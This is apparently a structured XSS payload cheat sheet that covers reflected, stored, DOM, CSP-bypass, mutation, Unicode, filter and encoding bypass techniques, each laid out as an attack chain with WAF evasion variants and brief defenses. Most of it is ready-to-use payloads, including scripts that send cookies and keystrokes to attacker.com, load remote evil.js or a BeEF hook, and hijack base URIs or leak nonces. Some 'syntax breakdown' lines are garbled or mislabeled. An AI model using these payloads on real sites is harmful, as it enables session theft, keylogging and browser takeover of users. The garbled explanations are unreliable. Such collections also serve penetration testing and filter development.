# XSS Cross-Site Scripting

_12 web payloads_

### Reflected XSS  `xss-reflected`
_Reflected cross-site scripting attack techniques_
Subcategory: **Reflected** · tags: `xss` `reflected` `javascript`

**Prerequisites:**
- User input is reflected onto the page
- Input is not filtered or encoded

**Attack Chain:**

**1. Probe for the XSS injection point**
> Basic XSS probing
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus "
```
**Syntax breakdown:**
- `<script>` — HTML script tag _tag_
- `alert(1)` — JavaScript popup function _function_
- `onerror` — image load error event _value_
- `onload` — element load complete event _value_

**2. Event handler bypass**
> Use various event handlers
```
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```
**Syntax breakdown:**
- `onerror` — error event _value_
- `onload` — load event _value_
- `onfocus` — focus event _value_
- `onstart` — start event _value_

**3. Tag bypass**
> Case obfuscation and tag transformation
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
```
**Syntax breakdown:**
- `ScRiPt` — mixed case bypass _value_
- `svg/onload` — use a slash instead of a space _value_

**4. Steal Cookies**
> Steal the user's cookies
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>location="http://attacker.com/steal?c="+document.cookie</script>
```
**Syntax breakdown:**
- `document.cookie` — obtain the current page's cookies _function_
- `new Image().src` — create an image object to send a request _value_
- `fetch()` — send a request using the Fetch API _function_

**5. Keylogging**
> Log the user's keyboard input
```
<script>
document.onkeypress=function(e){
  fetch("http://attacker.com/log?key="+e.key)
}
</script>
```
**Syntax breakdown:**
- `onkeypress` — key press event _value_
- `e.key` — the pressed key value _value_

**WAF/EDR Bypass Variants:**

**HTML entity encoding**
> Bypass using HTML entity encoding
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
**Syntax breakdown:**
- `&#97;` — decimal HTML entity of a _encoding_
- `&#x61;` — hexadecimal HTML entity of a _encoding_

**Unicode encoding**
> Bypass using Unicode encoding
```
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```
**Syntax breakdown:**
- `\a` — Unicode encoding of a _value_

**Double-write bypass**
> Double-write bypass of keyword removal
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```
**Syntax breakdown:**
- `<scr<script>` — HTML tag/event handler _tag_
- `ipt>alert(1)` — injected code _value_
- `</scr</script>` — HTML tag/event handler _tag_
- `ipt>
` — injected code _value_
- `<imimgg src=x onerror=alert(1)>` — HTML tag/event handler _tag_

**Comment obfuscation**
> Use comment obfuscation
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```
**Syntax breakdown:**
- `<script>` — HTML tag/event handler _tag_
- `/**/alert(1)/**/` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<img src=x/**/onerror=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<svg on<!--test-->` — HTML tag/event handler _tag_
- `load=alert(1)>` — injected code _value_

**Overview:** Reflected XSS is the most common type of XSS. The malicious script is passed to the server via a URL parameter and directly echoed in the response page. The victim must be induced to click a malicious link for it to trigger execution.

**Vulnerability Principle:** A reflected XSS vulnerability occurs when the server embeds user input (URL parameters, form fields, HTTP headers) directly into the HTML response without escaping. Common trigger points include locations where user input is echoed on search result pages, error pages, and 404 pages.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the XSS injection point
2. Bypass the filtering mechanism
3. Construct a malicious payload
4. Induce the victim to click the link
5. Steal cookies or perform malicious operations

**Defensive Measures:** Defenses:
1. HTML-entity-encode all user input
2. Use CSP (Content-Security-Policy)
3. Set the HttpOnly cookie flag
4. Input validation and allowlist filtering

---

### Stored XSS  `xss-stored`
_Stored cross-site scripting attack techniques_
Subcategory: **Stored** · tags: `xss` `stored` `persistent`

**Prerequisites:**
- A data storage feature exists
- Stored data is displayed without filtering

**Attack Chain:**

**1. Probe for the storage point**
> Probe for stored XSS
```
Enter in the comment area, username, personal bio, etc.:
<script>alert(1)</script>
"><script>alert(1)</script>
Test whether it is stored and executed
```
**Syntax breakdown:**
- `Enter in the comment area, username, personal bio, etc.:
` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `
">` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `
Test whether it is stored and executed` — injected code _value_

**2. Stealthy payload**
> Use a stealthy XSS payload
```
<img src=x onerror=alert(1) style="display:none">
<svg/onload=alert(1) style="position:absolute;left:-9999px">
<div style="background:url(javascript:alert(1))">
```
**Syntax breakdown:**
- `style="display:none"` — hide the element _value_
- `position:absolute;left:-9999px` — move it out of the viewport _value_

**3. Persistent control**
> Load an external malicious script
```
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://attacker.com/evil.js";
  document.body.appendChild(s);
}
</script>
```
**Syntax breakdown:**
- `createElement` — create a DOM element _function_
- `appendChild` — add to the DOM tree _function_

**4. BeEF Hook**
> Use the BeEF framework to control the browser
```
<script src="http://beef-server:3000/hook.js"></script>
Or:
<script>
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
</script>
```
**Syntax breakdown:**
- `<script src="http://beef-server:3000/hook.js">` — HTML tag/event handler _tag_
- `</script>` — HTML tag/event handler _tag_
- `
Or:
` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
` — injected code _value_
- `</script>` — HTML tag/event handler _tag_

**WAF/EDR Bypass Variants:**

**SVG tag bypass**
> Bypass using SVG tags
```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```
**Syntax breakdown:**
- `<svg>` — HTML tag/event handler _tag_
- `<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `</svg>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<svg>` — HTML tag/event handler _tag_
- `<animate onbegin=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<svg>` — HTML tag/event handler _tag_
- `<set onbegin=alert(1)>` — HTML tag/event handler _tag_

**Math tag bypass**
> Use MathML tags
```
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
```
**Syntax breakdown:**
- `<math>` — HTML tag/event handler _tag_
- `<maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">` — HTML tag/event handler _tag_
- `click` — injected code _value_
- `</maction>` — HTML tag/event handler _tag_
- `</math>` — HTML tag/event handler _tag_

**Overview:** Stored XSS is the most harmful type of XSS. The malicious script is permanently stored on the target server (database/file). Every user who visits the infected page automatically executes the malicious code, with no need to click a special link.

**Vulnerability Principle:** Trigger points for stored XSS include: user comments/message boards, profiles (username/signature/avatar URL), forum posts, instant messages, filenames, log viewers, and any content that is stored and then viewed by other users. The root cause is that no security handling is performed either when storing or when displaying.

**Exploitation Method:** Complete exploitation flow:
1. Find a data storage point
2. Inject a malicious script
3. Wait for other users to visit
4. Automatically execute malicious operations

**Defensive Measures:** Defenses:
1. HTML-encode before storing
2. Perform contextual encoding at output
3. Use a CSP policy
4. Regularly scan stored content

---

### DOM-Based XSS  `xss-dom`
_DOM-based cross-site scripting attack_
Subcategory: **DOM-Based** · tags: `xss` `dom` `javascript`

**Prerequisites:**
- JavaScript dynamically manipulates the DOM
- User input is written directly into the DOM

**Attack Chain:**

**1. Probe for DOM XSS**
> Probe for DOM-based XSS
```
#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
Check whether location.hash, location.search, etc. are written directly into the DOM
```
**Syntax breakdown:**
- `location.hash` — the part after # in the URL _value_
- `location.search` — the query string after ? in the URL _value_

**2. Common sink points**
> Common DOM XSS sink points
```
document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)
```
**Syntax breakdown:**
- `document.write` — write directly to HTML _value_
- `innerHTML` — set an element's HTML content _value_
- `eval()` — execute JavaScript code _value_

**3. location.hash exploitation**
> Exploit location.hash
```
URL: http://target.com/#<img src=x onerror=alert(1)>
If the page has: document.write(location.hash)
then XSS is triggered
```
**Syntax breakdown:**
- `URL: http://target.com/#` — injected code _value_
- `<img src=x onerror=alert(1)>` — HTML tag/event handler _tag_
- `
If the page has: document.write(location.hash)
then XSS is triggered` — injected code _value_

**4. postMessage exploitation**
> Exploit postMessage
```
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
Attack page:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```
**Syntax breakdown:**
- `<img>` — image tag _tag_
- `onerror` — error event _keyword_
- `alert()` — popup function _function_
- `innerHTML` — DOM content modification _variable_

**WAF/EDR Bypass Variants:**

**javascript: protocol variant bypass**
> Bypass javascript: protocol filtering via case obfuscation, HTML entity encoding, tab insertion, and so on
```
javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```
**Syntax breakdown:**
- `javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
` — injected code _value_
- `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` — HTML tag/event handler _tag_
- `click` — injected code _value_
- `</a>` — HTML tag/event handler _tag_

**SVG/MathML tags and event handler bypass**
> Bypass tag and event blacklists using non-standard HTML tags such as SVG and MathML and obscure event handlers (ontoggle, onpageshow)
```
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```
**Syntax breakdown:**
- `<svg onload=alert(1)>` — HTML tag/event handler _tag_
- `<svg/onload=alert(1)>` — HTML tag/event handler _tag_
- `<math>` — HTML tag/event handler _tag_
- `<mtext>` — HTML tag/event handler _tag_
- `<table>` — HTML tag/event handler _tag_
- `<mglyph>` — HTML tag/event handler _tag_
- `<svg>` — HTML tag/event handler _tag_
- `<mtext>` — HTML tag/event handler _tag_
- `<textarea>` — HTML tag/event handler _tag_
- `<path id="</textarea>` — HTML tag/event handler _tag_
- `<img onerror=alert(1) src=1>` — HTML tag/event handler _tag_
- `">
` — injected code _value_
- `<details open ontoggle=alert(1)>` — HTML tag/event handler _tag_
- `<body onpageshow=alert(1)>` — HTML tag/event handler _tag_
- `<input onfocus=alert(1) autofocus>` — HTML tag/event handler _tag_

**Overview:** DOM-based XSS executes entirely on the client side, and the malicious script does not pass through the server. An attacker manipulates the DOM environment (such as the URL fragment, document.referrer) so that the page's JavaScript reads and unsafely writes malicious content.

**Vulnerability Principle:** The source (input source) of DOM-based XSS includes location.hash, location.search, document.referrer, postMessage, and so on, and the sink (dangerous function) includes innerHTML, document.write, eval, setTimeout, and so on. The vulnerability is triggered when the source data is passed directly to the sink without sanitization.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the JavaScript code to find the sink point
2. Construct a malicious URL
3. Induce the victim to visit
4. The browser executes the malicious script

**Defensive Measures:** Defenses:
1. Use textContent instead of innerHTML
2. Encode DOM operations
3. Use secure framework APIs
4. Enable a CSP policy

---

### CSP Bypass  `xss-csp-bypass`
_XSS techniques for bypassing Content Security Policy (CSP)_
Subcategory: **CSP Bypass** · tags: `xss` `csp` `bypass`

**Prerequisites:**
- An XSS vulnerability exists
- A CSP policy exists but is misconfigured

**Attack Chain:**

**1. Analyze the CSP policy**
> Analyze the CSP configuration
```
View the HTTP response header:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
Or analyze using the CSP Evaluator tool
```
**Syntax breakdown:**
- `View the HTTP response header:` — command/keyword _command_

**2. Exploit unsafe-inline**
> Exploit the unsafe-inline configuration
```
If the CSP contains unsafe-inline:
<script>alert(1)</script>
inline scripts can be executed directly
```
**Syntax breakdown:**
- `If the CSP contains unsafe-inline:
` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `
inline scripts can be executed directly` — injected code _value_

**3. Exploit unsafe-eval**
> Exploit the unsafe-eval configuration
```
If the CSP contains unsafe-eval:
<script>eval("alert(1)")</script>
<script>setTimeout("alert(1)", 0)</script>
functions such as eval can be used
```
**Syntax breakdown:**
- `If the CSP contains unsafe-eval:
` — injected code _value_
- `<script>` — HTML tag/event handler _tag_
- `eval("alert(1)")` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `<script>` — HTML tag/event handler _tag_
- `setTimeout("alert(1)", 0)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `
functions such as eval can be used` — injected code _value_

**4. JSONP bypass**
> Bypass using JSONP
```
If an allowed domain has a JSONP endpoint:
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
Use the JSONP callback to execute code
```
**Syntax breakdown:**
- `callback` — JSONP callback parameter _value_

**5. AngularJS bypass**
> Bypass CSP using AngularJS
```
If an AngularJS CDN is allowed:
<div ng-app ng-csp>
<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
</div>
</div>
```
**Syntax breakdown:**
- `alert()` — popup function _function_

**6. Dangling Markup**
> Use dangling markup to steal data
```
<img src='http://attacker.com/?
Capture the subsequent HTML content until a single quote is encountered
```
**Syntax breakdown:**
- `<img>` — image tag _tag_

**WAF/EDR Bypass Variants:**

**JSONP endpoint to hijack CSP**
> Use a JSONP callback endpoint or the AngularJS library on a CSP-allowlisted domain to execute arbitrary JavaScript, without unsafe-inline
```
# Look for JSONP endpoints on allowlisted domains:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
```
**Syntax breakdown:**
- `# Look for JSONP endpoints on allowlisted domains:
` — injected code _value_
- `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)">` — HTML tag/event handler _tag_
- `</script>` — HTML tag/event handler _tag_
- `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js">` — HTML tag/event handler _tag_
- `</script>` — HTML tag/event handler _tag_
- `<div ng-app ng-csp>` — HTML tag/event handler _tag_
- `{{$eval.constructor("alert(1)")()}}` — injected code _value_
- `</div>` — HTML tag/event handler _tag_

**base-uri hijacking and script nonce leakage**
> Hijack the script loading source by exploiting an unrestricted base-uri directive in the CSP, or leak the script nonce value via CSS injection/DOM interfaces
```
# When base-uri is unrestricted:
<base href="http://attacker.com/">
# Scripts with relative paths on the page will load from attacker.com

# nonce leakage exploitation:
# Steal the nonce via CSS injection:
<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
# Or read via the DOM: document.querySelector("script[nonce]").nonce
```
**Syntax breakdown:**
- `# When base-uri is unrestricted:
` — injected code _value_
- `<base href="http://attacker.com/">` — HTML tag/event handler _tag_
- `
# Scripts with relative paths on the page will load from attacker.com

# nonce leakage exploitation:
# Steal the nonce via CSS injection:
` — injected code _value_
- `<style>` — HTML tag/event handler _tag_
- `script[nonce^="a"]{background:url(http://attacker.com/?n=a)}` — injected code _value_
- `</style>` — HTML tag/event handler _tag_
- `
# Or read via the DOM: document.querySelector("script[nonce]").nonce` — injected code _value_

**Overview:** CSP (Content Security Policy) is a browser-side XSS defense mechanism that prevents malicious code execution by restricting script sources. CSP bypass techniques break through the restrictions by exploiting policy configuration flaws or gadgets on trusted domains.

**Vulnerability Principle:** Common attack surfaces for CSP bypass: overly permissive unsafe-inline/unsafe-eval policies, an unrestricted base-uri leading to <base> tag hijacking, a script-src allowlist including CDN/JSONP endpoints, an unrestricted object-src allowing Flash/PDF XSS, a missing default-src fallback policy.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the CSP policy
2. Find an exploitable domain in the allowlist
3. Construct a bypass payload
4. Execute the malicious script

**Defensive Measures:** Defenses:
1. Use a strict CSP policy
2. Avoid unsafe-inline and unsafe-eval
3. Carefully review allowlisted domains
4. Use the nonce or hash method

---

### Mutation XSS (mXSS)  `xss-mxss`
_XSS attack caused by browser parsing differences_
Subcategory: **Mutation-Based** · tags: `xss` `mxss` `mutation` `bypass`

**Prerequisites:**
- An HTML output point exists
- Browser parsing differences

**Attack Chain:**

**1. Basic mXSS probing**
> Exploit the noscript tag parsing difference
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
**Syntax breakdown:**
- `<noscript>` — content displayed when scripts are disabled _tag_
- `p title` — the attribute value changes during parsing _value_
- `</noscript>` — the closing tag causes the mutation _tag_

**2. SVG mXSS**
> SVG CDATA mutation
```
<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
<svg><script><![CDATA[alert(1)]]></script></svg>
```
**Syntax breakdown:**
- `<script>` — script tag _tag_
- `<img>` — image tag _tag_
- `<svg>` — SVG tag _tag_
- `onerror` — error event handler _keyword_

**3. Math mXSS**
> MathML mutation XSS
```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```
**Syntax breakdown:**
- `<img>` — image tag _tag_
- `onerror` — error event handler _keyword_
- `alert()` — popup function _function_

**4. Combined with DOM clobbering**
> Use DOM clobbering
```
<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
```
**Syntax breakdown:**
- `id=x` — duplicate ID causes a DOM change _value_

**WAF/EDR Bypass Variants:**

**Nested tag bypass**
> SVG inner script encoding bypass
```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>a&#108;ert(1)</script></svg>
```
**Syntax breakdown:**
- `<svg>` — HTML tag/event handler _tag_
- `<script>` — HTML tag/event handler _tag_
- `&#97;lert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `</svg>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<svg>` — HTML tag/event handler _tag_
- `<script>` — HTML tag/event handler _tag_
- `a&#108;ert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `</svg>` — HTML tag/event handler _tag_

**Overview:** mXSS (Mutation XSS) exploits the differences in the browser's DOM parsing and serialization process, causing HTML that has passed through a security filter to produce a new XSS vector when rendered by the browser. It is an advanced technique for bypassing sophisticated filters such as DOMPurify.

**Vulnerability Principle:** mXSS exploits the DOM serialization → deserialization difference during innerHTML assignment: some HTML structures mutate when they are parsed and then re-serialized (such as SVG/MathML namespace switching, comment node parsing differences), turning originally safe HTML into code with script execution capability.

**Exploitation Method:** Complete exploitation flow:
1. Study the target's filter rules
2. Construct a mutation payload
3. Verify the parsing difference
4. Execute the malicious code

**Defensive Measures:** Defenses:
1. Use a secure library such as DOMPurify
2. Avoid innerHTML operations
3. Use textContent instead
4. Regularly update filter rules

---

### Unicode XSS  `xss-unicode`
_Use Unicode encoding characteristics to bypass filtering_
Subcategory: **Unicode Encoding** · tags: `xss` `unicode` `encoding` `bypass`

**Prerequisites:**
- An XSS injection point exists
- The filter checks keywords

**Attack Chain:**

**1. Unicode escapes**
> JavaScript Unicode escapes
```
<script>\u0061lert(1)</script>
<script>\x61lert(1)</script>
<script>\u{61}lert(1)</script>
```
**Syntax breakdown:**
- `\a` — Unicode escape of a (4-digit) _value_
- `\x61` — hexadecimal escape of a _value_
- `\u{61}` — Unicode code point escape of a _value_

**2. HTML entity encoding**
> HTML decimal/hexadecimal entities
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```
**Syntax breakdown:**
- `&#97;` — decimal HTML entity of a _encoding_
- `&#x61;` — hexadecimal HTML entity of a _encoding_

**3. Unicode normalization attack**
> Exploit Unicode normalization
```
Use normalization-equivalent characters:
＜script＞alert(1)＜/script＞
Bypass using full-width characters
```
**Syntax breakdown:**
- `＜` — full-width less-than sign (U+FF1C) _value_
- `＞` — full-width greater-than sign (U+FF1E) _value_

**4. UTF-7 encoding**
> UTF-7 encoded XSS
```
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
Requires the page to use UTF-7 encoding
```
**Syntax breakdown:**
- `+ADw-` — UTF-7 encoding of < _value_
- `+AD4-` — UTF-7 encoding of > _value_

**WAF/EDR Bypass Variants:**

**Mixed encoding bypass**
> Mix multiple encoding methods
```
<img src=x onerror=\u0061&#108;ert(1)>
<img src=x onerror="\u0061lert`1`">
```
**Syntax breakdown:**
- `<img src=x onerror=\a&#108;ert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<img src=x onerror="\alert`1`">` — HTML tag/event handler _tag_

**Overlong UTF-8 encoding**
> Exploit server UTF-8 parsing differences
```
<img src=x onerror=alert(1)>
Use a non-shortest UTF-8 encoding form
```
**Syntax breakdown:**
- `<img src=x onerror=alert(1)>` — HTML tag/event handler _tag_
- `
Use a non-shortest UTF-8 encoding form` — injected code _value_

**Overview:** Unicode XSS exploits the complexity of Unicode character encoding to bypass XSS filters, including techniques such as homoglyph character substitution, zero-width character insertion, and UTF-16/UTF-32 encoding differences, causing the malicious script to be interpreted differently by the filter and the browser.

**Vulnerability Principle:** Unicode XSS attack surface: 1) full-width characters replacing half-width (＜script＞) 2) UTF-7 encoding bypass (+ADw-script+AD4-) 3) zero-width characters (U+200B/U+FEFF) splitting keywords 4) Unicode normalization (NFC/NFKC) causing character transformation 5) IDN homoglyph attack domains to bypass filtering.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the encoding handling logic
2. Choose an appropriate encoding method
3. Bypass keyword filtering
4. Execute the malicious script

**Defensive Measures:** Defenses:
1. Uniformly use UTF-8 encoding
2. Normalize input before filtering
3. Use secure encoding functions
4. Avoid mixed encoding handling

---

### XSS Filter Bypass  `xss-filter-bypass`
_Various techniques for bypassing XSS filters_
Subcategory: **Filter Bypass** · tags: `xss` `filter` `bypass` `waf`

**Prerequisites:**
- An XSS injection point exists
- A filtering mechanism exists

**Attack Chain:**

**1. Case obfuscation**
> Mixed-case bypass
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<SvG OnLoAd=alert(1)>
```
**Syntax breakdown:**
- `ScRiPt` — mixed-case script tag _value_
- `OnErRoR` — mixed-case event handler _value_

**2. Double-write bypass**
> Double-write bypass of keyword removal
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```
**Syntax breakdown:**
- `scr<script>ipt` — after the middle script is removed, a complete tag forms _value_

**3. Comment obfuscation**
> Use comment obfuscation
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```
**Syntax breakdown:**
- `/**/` — JavaScript comment _operator_
- `<!--test-->` — HTML comment _value_

**4. Null byte truncation**
> Null byte truncation bypass
```
<scr\x00ipt>alert(1)</script>
<img src=x onerror=alert\x00(1)>
```
**Syntax breakdown:**
- `\x00` — null byte, some filters truncate here _value_

**5. Tag attribute bypass**
> Bypass using whitespace characters
```
<img src=x onerror=alert(1)>
<img src=x onerror =alert(1)>
<img src=x onerror	=alert(1)>
<img src=x onerror
=alert(1)>
```
**Syntax breakdown:**
- `onerror =` — space before the equals sign _value_
- `onerror	=` — Tab before the equals sign _value_

**6. Event handler variants**
> Use uncommon event handlers
```
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```
**Syntax breakdown:**
- `<body onpageshow=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<input onfocus=alert(1) autofocus>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<marquee onstart=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<video>` — HTML tag/event handler _tag_
- `<source onerror=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<details open ontoggle=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<audio src=x onerror=alert(1)>` — HTML tag/event handler _tag_

**WAF/EDR Bypass Variants:**

**Data URI bypass**
> Use a Data URI
```
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html,<script>alert(1)</script>">
```
**Syntax breakdown:**
- `<a href="data:text/html,<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `">click` — injected code _value_
- `</a>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<iframe src="data:text/html,<script>` — HTML tag/event handler _tag_
- `alert(1)` — injected code _value_
- `</script>` — HTML tag/event handler _tag_
- `">` — injected code _value_

**SVG animation bypass**
> SVG animation events
```
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```
**Syntax breakdown:**
- `<svg>` — HTML tag/event handler _tag_
- `<animate onbegin=alert(1)>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<svg>` — HTML tag/event handler _tag_
- `<set onbegin=alert(1)>` — HTML tag/event handler _tag_

**Overview:** XSS filter bypass is the most core skill in practice. It requires an in-depth understanding of the implementation flaws of various filter rules, constructing effective XSS vectors via HTML tag variants, event handler substitution, encoding mixing, DOM feature exploitation, and so on.

**Vulnerability Principle:** XSS filter bypass technique matrix: 1) blacklist bypass (use uncommon tags such as <svg>/<details>/<marquee>) 2) event handler substitution (onfocus/onmouseover instead of onclick) 3) attribute injection (autofocus combined with onfocus) 4) protocol bypass (javascript:/data:) 5) nested HTML entity encoding.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the filter rules
2. Test various bypass techniques
3. Find an effective payload
4. Execute the malicious code

**Defensive Measures:** Defenses:
1. Use allowlist filtering
2. Output encoding rather than input filtering
3. Use a CSP policy
4. Regularly update filter rules

---

### XSS Encoding Bypass  `xss-encoding`
_Use various encoding techniques to bypass XSS filtering_
Subcategory: **Encoding Bypass** · tags: `xss` `encoding` `bypass`

**Prerequisites:**
- An XSS injection point exists
- Encoding handling exists

**Attack Chain:**

**1. URL encoding**
> URL encoding bypass
```
<img src=x onerror=%61lert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
```
**Syntax breakdown:**
- `%61` — URL encoding of a _encoding_
- `%3C` — URL encoding of < _encoding_
- `%3E` — URL encoding of > _encoding_

**2. HTML entity encoding**
> HTML entity encoding
```
<img src=x onerror=&#97;lert(1)>
<img src=x onerror=&#x61;lert(1)>
&lt;script&gt;alert(1)&lt;/script&gt;
```
**Syntax breakdown:**
- `&#97;` — decimal HTML entity of a _encoding_
- `&#x61;` — hexadecimal HTML entity of a _encoding_
- `&lt;` — named entity of < _value_

**3. JavaScript encoding**
> JavaScript encoding
```
<img src=x onerror="\u0061lert(1)">
<img src=x onerror="\x61lert(1)">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```
**Syntax breakdown:**
- `\a` — Unicode escape _value_
- `atob()` — Base64 decode function _function_
- `YWxlcnQoMSk=` — Base64 of alert(1) _value_

**4. CSS encoding**
> CSS encoding (old IE)
```
<style>body{background:url("javascript:alert(1)")}</style>
<div style="x:expression(alert(1))">
```
**Syntax breakdown:**
- `<style>` — HTML tag/event handler _tag_
- `body{background:url("javascript:alert(1)")}` — injected code _value_
- `</style>` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<div style="x:expression(alert(1))">` — HTML tag/event handler _tag_

**5. Mixed encoding**
> Mix multiple encodings
```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
```
**Syntax breakdown:**
- `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">` — HTML tag/event handler _tag_
- `
` — injected code _value_
- `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">` — HTML tag/event handler _tag_
- `click` — injected code _value_
- `</a>` — HTML tag/event handler _tag_

**WAF/EDR Bypass Variants:**

**Double URL encoding**
> Double URL encoding
```
%253Cscript%253Ealert(1)%253C/script%253E
Use when the server decodes twice
```
**Syntax breakdown:**
- `%253Cscript%253Ealert(1)%253C/script%253E
Use when the server decodes twice` — injected code _value_

**UTF-16 encoding**
> UTF-16 encoding bypass
```
%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
```
**Syntax breakdown:**
- `%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E` — injected code _value_

**Overview:** XSS encoding bypass exploits multi-layer encoding (HTML entities, URL encoding, JavaScript encoding, Unicode) and differences in the browser's decoding order, causing the payload to not be recognized during filter checking but to be correctly parsed and executed during browser rendering.

